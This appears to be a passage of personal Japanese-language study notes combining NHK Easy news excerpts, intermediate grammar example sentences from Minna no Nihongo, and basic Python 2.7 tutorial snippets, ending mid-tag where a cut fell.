[ニュース_06](http://www3.nhk.or.jp/news/easy/k10010850561000/k10010850561000.html)\\n<blockquote>\\n<p>\\n鳥取県や兵庫県などでは、２３日から雪がたくさん降りました。\\n</p>\\n<p>\\n鳥取県の高速道路では２３日の午後から、雪が積もって車が動くことができなくなりました。多いときは６０台ぐらいの車が止まっていました。\\n</p>\\n<p>\\n鳥取県智頭町では雪が１m以上積もって、道で２６０台以上の車が動くことができなくなりました。車に乗っていた８２人が智頭町の公民館などに避難しました。自衛隊が車に乗っている人に食べ物や毛布などを配りました。\\n</p>\\n</blockquote>\\n#### [ニュース_07](http://www3.nhk.or.jp/news/easy/k10010829471000/k10010829471000.html)\\n<blockquote>\\n<p>\\n東京の築地市場で５日の朝、今年初めての競りがありました。競りには、日本中の港や外国からたくさんのまぐろが集まりました。今年最も高い値段になったのは、青森県の大間で取れた２１２ｋｇのまぐろでした。値段は７４２０万円で、今までで２番目に高くなりました。\\n</p>\\n<p>\\n築地市場は古くなったため、新しく作った豊洲市場に去年の１１月に引っ越す予定でした。しかし、豊洲市場の下にある土から体に悪い物質が見つかったため、いつ引っ越すことができるかわからなくなりました。\\n</p>\\n<p>\\n東京都の小池知事は、早い場合は今年の冬に豊洲市場に引っ越すことができると言っています。このため、築地市場での競りは今年で終わる可能性があります。\\n</p>\\n</blockquote>\\n#### [ニュース_08](http://www3.nhk.or.jp/news/easy/k10010853761000/k10010853761000.html)\\n<blockquote>\\n<p>\\n東京で２６日、スマートフォンを使って体に障害がある人や外国人に声で道を案内する実験がありました。\\n</p>\\n<p>\\n目に障害がある女性が、スマートフォンに向かって行きたい店の名前を話すと、「右に曲がって進んでください」などと声で案内します。車いすを使っている人には、階段やエスカレーターを使わない道などを伝えます。外国人のために英語で案内をすることもできます。\\n</p>\\n<p>\\nこのサービスを作った会社によると、今案内できるのは東京都の中央区の一部の場所だけです。会社は、オリンピックとパラリンピックを行う２０２０年までに、東京のどこでも使うことができるようにしたいと言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_09](http://www3.nhk.or.jp/news/easy/k10010852281000/k10010852281000.html)\\n<blockquote>\\n<p>\\n１月２８日は中国の正月の「春節」で、中国から多くの人が日本に旅行に来ます。農協や米を売る会社などの団体は２５日から、中国から旅行に来る人にパックに入ったごはんをプレゼントしています。\\n</p>\\n<p>\\n８つの観光案内所や電化製品を売る東京の店などで、３月までに１０万個プレゼントします。東京駅の前にある観光案内所では２５日、電子レンジで温めたごはんを中国人に食べてもらって、アンケートも行いました。\\n</p>\\n<p>\\n日本では、最近米があまり売れなくなっています。このため、農協などの団体は日本の米を輸出したいと考えて、中国人に宣伝することにしました。団体の人は「日本のおいしい米を多くの人に知ってもらいたいです」と話していました。\\n</p>\\n</blockquote>\\n#### [ニュース_10](http://www3.nhk.or.jp/news/easy/k10010851781000/k10010851781000.html)\\n<blockquote>\\n<p>\\n沖縄県北谷町にある遺跡で、漢字の「工」の字のような模様がある土器の一部が見つかりました。土器は土を焼いて作った食器などです。\\n</p>\\n<p>\\n北谷町が調べると、２５００年ぐらい前の縄文時代の終わりに、東北地方などにあった土器に似ていることがわかりました。この土器は「亀ヶ岡式土器」と言っていて、沖縄県で見つかったのは初めてです。\\n</p>\\n<p>\\nこの遺跡では、縄文時代の次の弥生時代の土器も見つかっています。北谷町は「この時代に文化の交流があったことがわかります」と言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_11](https://www3.nhk.or.jp/news/easy/k10010847101000/k10010847101000.html)\\n<blockquote>\\n<p>\\n水産庁は、２０１６年度の日本の海の「スルメイカ」などの量について発表しました。スルメイカはイカの中で最もたくさんとれて、日本でよく食べます。\\n</p>\\n<p>\\n水産庁によると、太平洋の方にいるスルメイカの量は、３３万４０００ｔでした。前の年度より３０％以上少くなくなりました。日本海の方にいるスルメイカの量も少くなくなりました。このため、去年日本でとれたスルメイカの量は、いつもの年の半分以下になったと考えられています。\\n</p>\\n<p>\\n水産庁は、スルメイカが卵を産むと言われている東シナ海の水の温度が低くなって、卵を産みにくくなっていることも原因の１つだと言っています。このほかにも少くなくなっている魚があって、大きな問題になっています。\\n</p>\\n</blockquote>\\n#### [ニュース_12](https://www3.nhk.or.jp/news/easy/k10010845481000/k10010845481000.html)\\n<blockquote>\\n<p>\\nもうすぐ花粉が飛ぶ季節になります。花粉が飛び始めると、花粉症の人はひどいくしゃみが出たり、目がかゆくなったりして大変です。\\n</p>\\n<p>\\n東京都によると、今年の春に飛ぶ杉やひのきの花粉は、東京都では１cm²に３８００個〜５２００個になりそうです。去年と同じぐらいです。花粉が飛び始めるのは２月１５日〜１８日ごろになりそうです。\\n</p>\\n<p>\\n花粉は、暖かい日や風が強くて空気が乾いている晴れた日にたくさん飛びます。杉の花粉は３月、ひのきの花粉は４月に特に多くなって、５月中旬まで飛びそうです。\\n</p>\\n<p>\\n東京都は、かぜなどで体が弱くなっていると花粉症がひどくなるため、健康に気をつけるように言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_13](https://www3.nhk.or.jp/news/easy/k10010843401000/k10010843401000.html)\\n<blockquote>\\n<p>\\n日本へ旅行に来た外国人が日本人と会話をするときに便利なカードを、東京にある印刷会社などが作りました。\\n</p>\\n<p>\\nカードには日本語と英語と中国語で「泊まることができる場所はありますか」とか「トイレはどこですか」などと書いてあります。日本語を話すことができなくても、このカードを見せてコミュニケーションをすることができます。\\n</p>\\n<p>\\nこのカードは無料で、今年の春から東京の浅草のレストランやホテルなどに置きます。インターネットを使うための無線のＷｉ－Ｆｉの場所などがわかる地図も一緒にもらうことができます。\\n</p>\\n</blockquote>\\n#### [ニュース_14](https://www3.nhk.or.jp/news/easy/k10010843331000/k10010843331000.html)\\n<blockquote>\\n<p>\\n会社が社員などを長い時間働かせることが問題になっています。厚生労働省は、去年４月から残業が１か月に８０時間より多い人がいる場合、会社などに行って調べています。９月までの半年で約１万の会社などを調べました。\\n</p>\\n<p>\\n調べた結果、４４％の約４４００の会社などで、会社と社員で決めた時間より長く残業させていたことがわかりました。残業代を払っていないところは６００以上ありました。健康診断をしていないところもあって、６０％以上の会社などが法律に違反していました。\\n</p>\\n</blockquote>\\n#### [ニュース_15](https://www3.nhk.or.jp/news/easy/k10010836891000/k10010836891000.html)\\n<blockquote>\\n<p>\\n日本マイクロソフトによると、１２日から、うそのメールがたくさん見つかっています。うそのメールは、「マイクロソフト社のセキュリティチーム」が送ったように書いてあります。メールのタイトルは「ご注意！ＯＦＦＩＣＥのプロダクトキーが不正コピーされています」などです。\\n</p>\\n<p>\\nメールには、ワードやエクセルなどのソフトウエアを使うときに必要なプロダクトキーがほかの人にコピーされたと書いてあります。そして、メールに出ているリンクをクリックするように書いてあります。クリックすると、うそのウェブサイトが開きます。\\n</p>\\n<p>\\n日本マイクロソフトは、コンピューターにウイルスが入ったり、自分の情報が盗まれたりする危険があるため、うそのメールは開かないで消すように言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_16](https://www3.nhk.or.jp/news/easy/k10010834181000/k10010834181000.html)\\n<blockquote>\\n<p>\\n三菱総合研究所は、人のように自分で考えるコンピューターのＡＩやロボットなどを使うことが増えると、人の仕事がどのように変わるか調べました。\\n</p>\\n<p>\\n研究所によると、２０３０年にはＡＩを使って専門の仕事をする人などが増えて、全部で５００万人がする仕事が増えます。しかし、物を作る工場などではＡＩやロボットが人の代わりに仕事をするため、７４０万人がする仕事がなくなります。このため、計算すると２４０万人がする仕事がなくなります。\\n</p>\\n<p>\\n研究所は、新しい技術を使うことができなくて仕事がなくなる人が増えないように考えることが必要だと言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_17](https://www3.nhk.or.jp/news/easy/k10010849581000/k10010849581000.html)\\n<blockquote>\\n<p>\\nスマートフォンでお金を払うことができる「アリペイ」というサービスは、中国で４億人以上が利用しています。コンビニのローソンは、１月２４日から日本にある全部の店でこのサービスを利用できるようにしました。\\n</p>\\n<p>\\n１月２８日から中国の正月の「春節」が始まります。ローソンは、春節に日本へ旅行に来るたくさんの中国人に買い物をしてほしいと考えています。\\n</p>\\n<p>\\n日本では、ほかにも「アリペイ」を利用できる店があります。福岡市では、市と商店街がこのサービスを始めるための実験を行っています。\\n</p>\\n</blockquote>\\n#### [ニュース_18](https://www3.nhk.or.jp/news/easy/k10010844481000/k10010844481000.html)\\n<blockquote>\\n<p>\\n中国の福建省にある「パンダ研究センター」にいるパンダが、「世界で最も長く生きているパンダ」というギネスの記録になりました。このパンダはことし３７歳になる雌の「バス」で、人間の年にすると１００歳以上です。\\n</p>\\n<p>\\nパンダ研究センターでは１８日、ギネスの記録になったお祝いをしました。「バス」は頭に飾りをのせて、おかゆをおいしそうに食べていました。\\n</p>\\n<p>\\n「バス」は若いときに自転車に乗るなどいろいろな芸をして有名になりました。今は目などに少し病気がありますが、元気に生活しています。\\n</p>\\n</blockquote>\\n#### [ニュース_19](https://www3.nhk.or.jp/news/easy/k10010861721000/k10010861721000.html)\\n<blockquote>\\n<p>\\n警察によると、電話やメールなどでだましてお金をとる詐欺は、２０１６年に１万４１５１件ありました。詐欺でとられたお金は全部で４０６億円以上でした。前の年より少なくなりましたが、４００億円以上の年が４年続いています。\\n</p>\\n<p>\\nいちばん多かったのは、息子や孫だとうそを言ってお金をとる詐欺でした。次に多かったのは、利用していないウェブサイトなどの料金を払えとメールや手紙を送ってくる詐欺でした。\\n</p>\\n<p>\\n「私は役所の職員です。税金が戻ってきますよ」などと言って、ＡＴＭでお金を送らせる詐欺は、前の年より増えました。\\n</p>\\n<p>\\nだまされた人の７８％が６５歳以上でした。警察は、銀行などともっと協力してお年寄がだまされないようにしたいと言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_20](https://www3.nhk.or.jp/news/easy/k10010866331000/k10010866331000.html)\\n<blockquote>\\n<p>\\n北海道札幌市で６８回目の「さっぽろ雪まつり」が６日から始まりました。毎年日本や外国から２００万人以上の人が、雪や氷で作った像を見に来ます。\\n</p>\\n<p>\\n今年は３つの会場に全部で２００の像が並んでいます。大通公園の会場には、雪で作った高１７ｍ以上の建物の像があります。有名なフランスの凱旋門です。去年「ＰＰＡＰ」の歌で有名になったピコ太郎さんの像も雪で作りました。\\n</p>\\n<p>\\n大阪から来た女性は「初めて見ましたが、顔の細かい所まで作ってあってびっくりしました」と話していました。\\n</p>\\n<p>\\n「さっぽろ雪まつり」は１２日までです。\\n</p>\\n</blockquote>\\n#### [ニュース_21](http://www3.nhk.or.jp/news/easy/k10010874411000/k10010874411000.html)\\n<blockquote>\\n<p>\\n北朝鮮は１２日、ミサイルを発射しました。ミサイルは東に５００ｋｍ飛んで日本海に落ちたと韓国は言っています。\\n</p>\\n<p>\\n北朝鮮は「きのう新しいミサイルを発射する実験に成功した」と１３日に発表しました。\\n</p>\\n<p>\\nミサイルの発射は、安倍総理大臣とアメリカのトランプ大統領が会って、北朝鮮は核兵器やミサイルを作るのをやめるように言ったあとでした。安倍総理大臣とトランプ大統領はすぐに北朝鮮を非難するメッセージを発表しました。安倍総理大臣は「決して許すことはできない」と言いました。\\n</p>\\n</blockquote>\\n#### [ニュース_22](http://www3.nhk.or.jp/news/easy/k10010868931000/k10010868931000.html)\\n<blockquote>\\n<p>\\n牛丼の「吉野家」によると、「牛丼１５，０００円分が食べ放題」などと書いたうその広告が、先月からインターネットに出ています。広告には吉野家と似ているマークや牛丼の写真も出ていました。\\n</p>\\n<p>\\nうその広告には、別のアドレスにメールを送るように書いてあります。このアドレスにメールを送ると、吉野家とは関係のない広告のメールが届くようになります。\\n</p>\\n<p>\\n吉野家は「私たちが出した広告ではありません」と話しています。そして、うその広告に書いてあるアドレスにメールを送らないように言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_23](http://www3.nhk.or.jp/news/easy/k10010875021000/k10010875021000.html)\\n<blockquote>\\n<p>\\n外国人があまり知らない日本の観光地を紹介するホテルが、東京都中央区にできました。日本の観光地をインターネットのビデオで紹介している会社が作りました。\\n</p>\\n<p>\\nホテルの１階にはコンピューターと大きなテレビがあって、いろいろな観光地のビデオを見たり、行き方を調べたりできます。ホテルによると、外国人にもっと来てほしいと考えている市や町がたくさんあります。\\n</p>\\n<p>\\n働いている人はほとんどが外国人で、日本のいろいろな観光地をよく知っている人たちです。ホテルは「日本に来た外国人に、今まで知らなかった場所にも行ってほしいと思います」と話しています。\\n</p>\\n</blockquote>\\n#### [ニュース_24](http://www3.nhk.or.jp/news/easy/k10010882351000/k10010882351000.html)\\n<blockquote>\\n<p>\\n東京都立川市の７つの小学校に通う子どもや先生などが、１７日の夕方からおなかが痛くなったり吐いたりしました。\\n</p>\\n<p>\\n立川市によると、具合が悪くなったのは、８７４人の子どもと６９人の先生などです。入院した子どももいますが、重症ではありません。\\n</p>\\n<p>\\n７つの小学校は、同じ給食センターで作った給食を食べています。保健所は、給食が原因かもしれないと考えて調べています。\\n</p>\\n</blockquote>\\n#### [ニュース_25](http://www3.nhk.or.jp/news/easy/k10010885381000/k10010885381000.html)\\n<blockquote>\\n<p>\\n鳥取県にある青谷横木遺跡という遺跡では、１０００年以上前にあった「山陰道」という道の跡が見つかっています。\\n</p>\\n<p>\\n鳥取県埋蔵文化財センターがこの遺跡を調べると、１８個の柳の木の根が見つかりました。木の根は５０ｃｍ～２ｍの間をあけてまっすぐ並んでいました。\\n</p>\\n<p>\\n鳥取県埋蔵文化財センターは、１０世紀の終わりごろの平安時代に「山陰道」に植えた木の根だろうと言っています。こんなに古い時代に道に木を並べて植えた跡が見つかったのは日本では初めてだと言っています。\\n</p>\\n</blockquote>\\n#### [ニュース_26](http://www3.nhk.or.jp/news/easy/k10010885231000/k10010885231000.html)\\n<blockquote>\\n<p>\\n国は、日本の陸や周りの海にある活断層などのうち９７を「主要活断層帯」に決めて、地震が起こる可能性などを調べています。「主要活断層帯」は断層の長さや活動の多さなどで決めています。\\n</p>\\n<p>\\n２１日の会議で、地下にも断層が続いていたり、活動が多くなっていたりしていると考えられるほかの活断層などについて、話し合いました。\\n</p>\\n<p>\\nそして、中国地方の８つ、九州地方の６つ、関東地方などの２つの全部で１６の活断層などを新しく「主要活断層帯」にすることを決めました。日本の「主要活断層帯」は全部で１１３になりました。\\n</p>\\n</blockquote>\\n#### [ニュース_27](http://www3.nhk.or.jp/news/easy/k10010883581000/k10010883581000.html)\\n<blockquote>\\n<p>\\n携帯電話の会社のＫＤＤＩは、ビルの中のトイレが空いているかどうかスマートフォンなどでわかるサービスを３月から始めます。\\n</p>\\n<p>\\nトイレのドアにはセンサーを付けます。センサーはインターネットとつながっていて、人が入っていないトイレをスマートフォンやパソコンで知ることができます。トイレに入っている時間が長くなると、メールでビルの会社に知らせます。\\n</p>\\n<p>\\nＫＤＤＩは、いろいろな会社のビルやデパートなどでこのサービスを利用してほしいと考えています。\\n</p>\\n</blockquote>\\n#### [ニュース_28](http://www3.nhk.or.jp/news/easy/k10010883221000/k10010883221000.html)\\n<blockquote>\\n<p>\\n昔、忍者が住んでいた滋賀県甲賀市と三重県伊賀市は、２月２２日を「忍者の日」にして、イベントを行っています。甲賀市の役所では２０日から２４日まで、職員が忍者の服を着て仕事をしています。\\n</p>\\n<p>\\n約２０人の職員たちは黒や赤の忍者の服を着て、電話をしたり、パソコンを使ったりしていました。職員は「忍者なので、いつもよりも早く仕事ができそうです」と話していました。\\n</p>\\n<p>\\n甲賀市では２２日に忍者について勉強する会などを行います。甲賀市の職員は「ぜひ遊びに来てほしいです」と話していました。\\n</p>\\n</blockquote>\\n#### [ニュース_29](http://www3.nhk.or.jp/news/easy/k10010889941000/k10010889941000.html)\\n<blockquote>\\n<p>\\n中国の北京で２５日と２６日、日本の九州、北陸、東北の食べ物や工芸品などを紹介するイベントがありました。このイベントは、日本の政府が、外国人に人気がある東京や京都だけではなくて、いろいろな町のよさを知ってほしいと考えて行いました。\\n</p>\\n<p>\\n会場には、職人が陶器を作って見せている所や、日本酒を飲むことができる所があって、たくさんの人が集まっていました。\\n</p>\\n<p>\\n日本酒を飲んでみた若い男性は「飲みやすくておいしいです」と話していました。若い女性は「九州で寺に行ったり、食べ物を楽しんだりしたいです」と話していました。\\n</p>\\n</blockquote>\\n#### [ニュース_30](http://www3.nhk.or.jp/news/easy/k10010890231000/k10010890231000.html)\\n<blockquote>\\n<p>\\n働く人が足りないため、店員がいなくても、レジで客が自分で計算してお金を払うシステムを使う店が増えています。\\n</p>\\n<p>\\nＤＶＤなどを貸す店の「ゲオ」では、２年前からこのシステムを使っています。客は、ＤＶＤや本などに付いているバーコードを機械に読ませて、お金を払います。このシステムを使っている店は、客がレジで待つ時間が短くなって、売り上げが増えていると言っています。３月には、７４５の店でこのシステムを使う予定です。\\n</p>\\n<p>\\nレストランの「ガスト」などでは１月に、東京にある３つの店でこのシステムを使ってみました。その結果、客が多い時間でも、レジにあまり人が並ばなくなりました。店員は、レジ以外の仕事にもっと時間を使うことができるようになりました。\\n</p>\\n</blockquote>\\n#### [ニュース_31](http://www3.nhk.or.jp/news/easy/k10010912421000/k10010912421000.html)\\n<blockquote>\\n<p>\\n２０２０年にオリンピックとパラリンピックがあるため、東京の近くには新しいホテルがたくさんできています。千葉県浦安市に、ロボットが人の代わりに働くホテルができました。\\n</p>\\n<p>\\nホテルのフロントでは、恐竜の形をしたロボットが日本語や英語、中国語、韓国語で客と話します。客が泊まる部屋にもロボットが置いてあります。このロボットに話すと、テレビやエアコンをつけたり消したりすることができます。\\n</p>\\n<p>\\nこのホテルを経営している会社は、長崎県にあるテーマパークのハウステンボスでも、ロボットを使ったホテルを経営しています。ホテルの社長は「日本に来た外国人に、ロボットがいるホテルを楽しんでほしいです」と話していました。\\n</p>\\n</blockquote>\\n#### [ニュース_32](http://www3.nhk.or.jp/news/easy/k10010911661000/k10010911661000.html)\\n<blockquote>\\n<p>\\nタイのバンコクの空港に１０日、アフリカのエチオピアから来た飛行機の荷物を、タイ人の２人の女が取りに来ました。２人は別の飛行機で来たため、空港の職員がおかしいと思って荷物の中をチェックすると、サイの角が２１本見つかりました。\\n</p>\\n<p>\\n世界ではサイの数が少なくなって、将来いなくなる可能性が高いため、輸出や輸入は禁止されています。しかし、ベトナムや中国ではサイの角が薬になるため、高い値段で売ったり買ったりしています。タイの空港で見つかったサイの角を売ると５億円ぐらいになります。\\n</p>\\n<p>\\n警察は、荷物を取りに来て逃げた２人の女をさがしています。\\n</p>\\n</blockquote>\\n#### [ニュース_33](http://www3.nhk.or.jp/news/easy/k10010911101000/k10010911101000.html)\\n<blockquote>\\n<p>\\n国立情報学研究所のグループは、外国人が日本へ旅行に来て、どこからどこへ行ったかすぐにわかるシステムを作りました。\\n</p>\\n<p>\\n旅行に来た外国人が無料で利用できる無線のＬＡＮのデータを使うと、外国人がいた場所が地図に出ます。そして、外国人がどこからどこへ行ったかわかります。\\n</p>\\n<p>\\nこのシステムを使って、先月東京であったマラソンの大会のコースの近くにいた外国人２３５人について調べました。その結果、ゴールがあった東京駅の近くなどから、夜は新宿や上野へ行ったことがわかりました。\\n</p>\\n</blockquote>\\n#### [ニュース_34](http://www3.nhk.or.jp/news/easy/k10010909711000/k10010909711000.html)\\n<blockquote>\\n<p>\\n政府は新しい法律を作って、残業の規則を厳しくしようと考えています。\\n</p>\\n<p>\\n会社を経営している人たちの団体の経団連と、働く人たちの団体の連合は、残業の規則を何時間までにするか話し合あっていました。２つの団体は、忙しいときでも１年の残業を７２０時間までにする案などに賛成していました。しかし、忙しいときの１か月の残業を何時間までにするかについては違う意見でした。\\n</p>\\n<p>\\n安倍総理大臣は１３日、経団連の榊原会長と、連合の神津会長と会いました。そして、忙しいときでも１か月の残業は１００時間より少なくしたいと言いました。経団連と連合は、安倍総理大臣の言うとおりにしようと考えています。\\n</p>\\n</blockquote>\\n#### [ニュース_35](http://www3.nhk.or.jp/news/easy/k10010902081000/k10010902081000.html)\\n<blockquote>\\n<p>\\nタイのバンコクの空港にアフリカのエチオピアから着いた荷物から、３日と４日、全部で３３０ｋｇの象牙が見つかりました。アフリカゾウという象５０頭以上の象牙が、１５個の荷物の中に入っていて、たくさんの石の中に隠してありました。\\n</p>\\n<p>\\nタイの警察は、荷物を取りに来た男を逮捕して、この男と関係があるグループについて調べることにしています。\\n</p>\\n<p>\\n象牙の輸出や輸入は禁止されています。しかし、中国のお金持ちの中には、部屋などに飾るため象牙で作った物を買う人が多いと言われています。タイの警察は、見つかった象牙は、隠れて中国などに輸出しようとした物だと考えています。\\n</p>\\n</blockquote>\\n#### [ニュース_36](http://www3.nhk.or.jp/news/easy/k10010918801000/k10010918801000.html)\\n<blockquote>\\n<p>\\n気象庁は、東京の靖国神社にあるソメイヨシノという桜の木を調べて、花が咲くと発表しています。\\n</p>\\n<p>\\n２１日、桜の花が５つ咲いていることがわかって、「東京で桜の花が咲きました」と発表しました。今年は日本でいちばん早く東京で桜の花が咲きました。\\n</p>\\n<p>\\n気象庁によると、東京の桜は１週間から１０日ぐらいで満開になりそうです。\\n</p>\\n</blockquote>\\n#### [ニュース_37](http://www3.nhk.or.jp/news/easy/k10010914911000/k10010914911000.html)\\n<blockquote>\\n<p>\\n日本の政府は１７日、鹿児島県の種子島宇宙センターから人工衛星を打ち上げました。\\n</p>\\n<p>\\nこの人工衛星は、地球の周りを飛びながら、陸や海のいろいろな場所を撮影して情報を集めます。夜や天気が悪いときでも電波を使って撮影することができます。\\n</p>\\n<p>\\n人工衛星の情報は、北朝鮮がミサイルを発射する場所や、日本の周りの海、災害の様子などを調べるために使います。\\n</p>\\n<p>\\n情報を集める日本の人工衛星は７つ目です。地球の全部を１日に１回以上、撮影できるようになりました。\\n</p>\\n</blockquote>\\n#### [ニュース_38](http://www3.nhk.or.jp/news/easy/k10010919331000/k10010919331000.html)\\n<blockquote>\\n<p>\\n厚生労働省は毎年、お年寄を殴ったりいじめたりする「虐待」がどのくらいあったか調べています。\\n</p>\\n<p>\\n２０１５年度は、お年寄を介護する施設の職員からの虐待が４０８件ありました。前の年度より１０８件増えて、今までで最も多くなりました。職員の知識や技術が足りないことや、ストレスが多いことなどが原因です。\\n</p>\\n<p>\\n一緒に住んでいる家族などからの虐待は１万５９７６件ありました。体を殴ったりすることが最も多くて、ひどいことを言って心に傷をつけたり、必要な世話をしなかったりすることもありました。息子からの虐待が最も多くて、次は夫と娘からでした。\\n</p>\\n</blockquote>\\n#### [ニュース_39](http://www3.nhk.or.jp/news/easy/k10010929061000/k10010929061000.html)\\n<blockquote>\\n<p>\\n熊本県立図書館は、去年４月の大きな地震で建物が壊れました。１階は去年６月に利用できるようになりましたが、２階と３階は天井などを直していて利用できませんでした。\\n</p>\\n<p>\\n２９日、１階から３階まで全部利用できるようになった図書館が開きました。１階には子どものための本、２階には普通の本、３階には熊本県などについて書いた本が地震の前と同じように並んでいます。\\n</p>\\n<p>\\n来た女性は「ここで本を読むのを楽しみにしていました」と話していました。図書館の人は「長い間お待たせしました。前と同じように利用してほしいと思います」と話しています。\\n</p>\\n</blockquote>\\n#### [ニュース_40](http://www3.nhk.or.jp/news/easy/k10010921801000/k10010921801000.html)\\n<blockquote>\\n<p>\\n名古屋市には有名な城の名古屋城があります。城でいちばん立派な建物の天守閣は１６１２年にできました。天守閣は戦争で焼けてしまったため、１９５９年に鉄筋コンクリートでもう１度建てました。しかし、最近、この建物が古くなってきました。\\n</p>\\n<p>\\n名古屋市は、天守閣をもう１度建てることについて議会で相談していました。そして、昔のように木で建てることを決めました。工事には５００億円以上かかります。\\n</p>\\n<p>\\n名古屋市は、２０１９年の秋ごろに今の天守閣を壊わして、２０２２年に新しい天守閣ができるようにしたいと考えています。\\n</p>\\n</blockquote>\\n###みんなの日本語中級１文型\\n####第一課\\n* ソースの見方を教えて頂けませんか。\\n* 猫のように可愛い彼女を探したいです。\\n* 私の趣味は漢方薬の本を読むことです。\\n* 正月に神社やお寺に行くことを初詣でと言う\\n* Fabricというツールを知っている\\n* どんなに高くても一戸建てを買いたいです。\\n####第二課\\n* 鞄を開けたら、パスポートがなくなっていた。\\n* Tudouというのは中国で有名なサイトのことです。\\n* 母に財布を忘れないように注意します\\n* ジュースみたいなお酒しか飲みません\\n####第三課\\n* 月曜日は休ませていただきますか？\\n* 来年帰国するにします。\\n* 生物を食べないことにしています\\n* このチケットを担当することになりました。\\n* 明日の18時から忘年会を行うことになっています。\\n* 早く春が来てほしい。\\n* あのアニメはあまり面白くなさそうです。\\n####第四課\\n* 山田さんから電話があったのですが、約束の時間に少し遅れるということです。\\n* グループ長は山田さんにアメリカへ出張させました。\\n* 昨日母に部屋を掃除させられました。\\n* 新卒の山田さんをご紹介します\\n* 妹は友達の本を欲しがっている\\n####第五課\\n* 改札口を出て、階段を上ったところで、待っていてください。\\n* 家を出ようとしたとき、電話がかかってきた\\n* 鈴木さんはいい社長になるだろうと思います。\\n####第六課\\n* 値段が高いので、iPhoneを買うつもりはありません\\n* タイへ旅行に行くつもりでしたが、両親に会いたいので、帰国することにします。\\n* 一生懸命にやっているつもりです。\\n* 星が見えてきた。\\n* この猫は一日中、寝てばかりいる。\\n####第七課\\n* 週報は日本語でなくてはなりません\\n* 中山さんが書いたコードは素晴らしく、感心させられました。\\n* 毎日自分でご飯を作って、母をびっくりさせました。\\n* 頭が痛いなら、この薬を飲むといいですよ\\n####第八課\\n* 電車に乗っている間、3DSをしていた。\\n* このチケットは金曜日までにできたほうがいいと思います。\\n* 好きな食べ物は人によって違います\\n* 眼鏡をかけたまま、お風呂に入りました。\\n####第九課\\n* ここに座ってもかまいませんか\\n* 神戸は尼崎より有名ですが、大阪ほど有名ではない。\\n* 彼女ほど可愛い人はいません。\\n* お金があれば、この一戸建てが買えたのに...\\n####第十課\\n* そのゲームなら、面白いはずです。\\n* 人気がある映画なのだから、面白くないはずはありません。\\n* 忘年会に行くはずだった。しかし、病気で行けなくなった。\\n* 母の料理がいつも美味しいですが、時々美味しくないこともあります。\\n####第十一課\\n* これから、日本で働く外国人が増えていくでしょう\\n* 新聞によると、東京で大きい雪が降ったらしい。\\n* 東京は、日本の首都として世界中に知られている。\\n####第十二課\\n* 週末は本を読んだり、テレビを見たりしています。\\n* 私は昨日雨にふられて、濡れてしまった。\\n* 値段が安かったおかげで、たくさん林檎を買えました。\\n* 事故のせいで、授業に遅れてしまいました。\\n##Python\\n###資料\\n[Python Tutorial (英語)](https://docs.python.org/2.7/tutorial/index.html)\\n\\n[Python Tutorial (中国語)](http://www.pythondoc.com/pythontutorial27/index.html)\\n\\n[Python Tutorial (日本語)](http://docs.python.jp/3/tutorial/index.html)\\n###学んだこと\\n####基礎知識\\n#####Python インタプリタ\\n* Python インタプリタは、それが使えるマシン上では通常 `/usr/local/bin/python` としてインストールされています。その他の場所としては `/usr/local/python` が一般的です。\\n#####Python の紹介\\n* 割り算 (`/`), `//` 演算子,`**` 演算子\\n<pre><code class=\\\"python\\\">>>> 17 / 3  # int / int -> int\\n5\\n>>> 17 / 3.0  # int / float -> float\\n5.666666666666667\\n>>> 17 // 3.0  # explicit floor division discards the fractional part\\n5.0\\n>>> 17 % 3  # the % operator returns the remainder of the division\\n2\\n>>> 5 ** 2  # 5 squared\\n25\\n>>> 2 ** 7  # 2 to the power of 7\\n128\\n</code></pre>\\n* 対話モードでは、最後に表示された結果は変数 `_` に代入されます。このことを利用すると、Python を電卓として使うときに、計算を連続して行う作業が多少楽になります\\n<pre><code class=\\\"python\\\">>>> tax = 12.5 / 100\\n>>> price = 100.50\\n>>> price * tax\\n12.5625\\n>>> price + _\\n113.0625\\n>>> round(_, 2)\\n113.06\\n</code></pre>\\n* 文字列は `+` 演算子で連結させる (くっつけて一つにする) ことができ、`*` 演算子で反復させることができます\\n<pre><code class=\\\"python\\\">>>> # 3 times 'un', followed by 'ium'\\n>>> 3 * 'un' + 'ium'\\n'unununium'\\n</code></pre>\\n* 末尾にコンマを入れると、出力を行った後に改行されません。\\n#####その他の制御フローツール\\n* ループ文は `else` 節を持つことができます。これは、 (`for` で) 反復処理対象のリストを使い切ってループが終了したとき、または (`while` で) 条件が偽になったときに実行されますが、 `break` 文でループが終了したときは実行されません\\n<pre><code class=\\\"python\\\">>>> for n in range(2, 10):\\n...     for x in range(2, n):\\n...         if n % x == 0:\\n...             print n, 'equals', x, '*', n/x\\n...             break\\n...     else:\\n...         # loop fell through without finding a factor\\n...         print n, 'is a prime number'\\n...\\n2 is a prime number\\n3 is a prime number\\n4 equals 2 * 2\\n5 is a prime number\\n6 equals 2 * 3\\n7 is a prime number\\n8 equals 2 * 4\\n9 equals 3 * 3\\n</code></pre>\\n* デフォルト値は、関数が定義された時点で、関数を 定義している 側のスコープ (scope) で評価されるので, `5` を出力します。\\n<pre><code class=\\\"python\\\">i = 5\\n\\ndef f(arg=i):\\n    print arg\\n\\ni = 6\\nf()\\n</code></pre>\\n#####データ構造\\n* 引数リストのアンパック\\n<pre><code class=\\\"python\\\">>>> list(range(3, 6))            # normal call with separate arguments\\n[3, 4, 5]\\n>>> args = [3, 6]\\n>>> list(range(*args))            # call with arguments unpacked from a list\\n[3, 4, 5]\\n\\n>>> def parrot(voltage, state='a stiff', action='voom'):\\n...     print \\\"-- This parrot wouldn't\\\", action,\\n...     print \\\"if you put\\\", voltage, \\\"volts through it.\\\",\\n...     print \\\"E's\\\", state, \\\"!\\\"\\n...\\n>>> d = {\\\"voltage\\\": \\\"four million\\\", \\\"state\\\": \\\"bleedin' demised\\\", \\\"action\\\": \\\"VOOM\\\"}\\n>>> parrot(**d)\\n-- This parrot wouldn't VOOM if you put four million volts through it. E's bleedin' demised !\\n</code></pre>\\n* `filter(function, sequence)` は、シーケンス `sequence`中の要素 `item` から、 `function(item)` が真となるような要素からなるシーケンスを返します。もし `sequence` が `str` か `unicode` か `tuple` なら、返り値も同じ型になります。そうでなければ `list` になります。\\n<pre><code 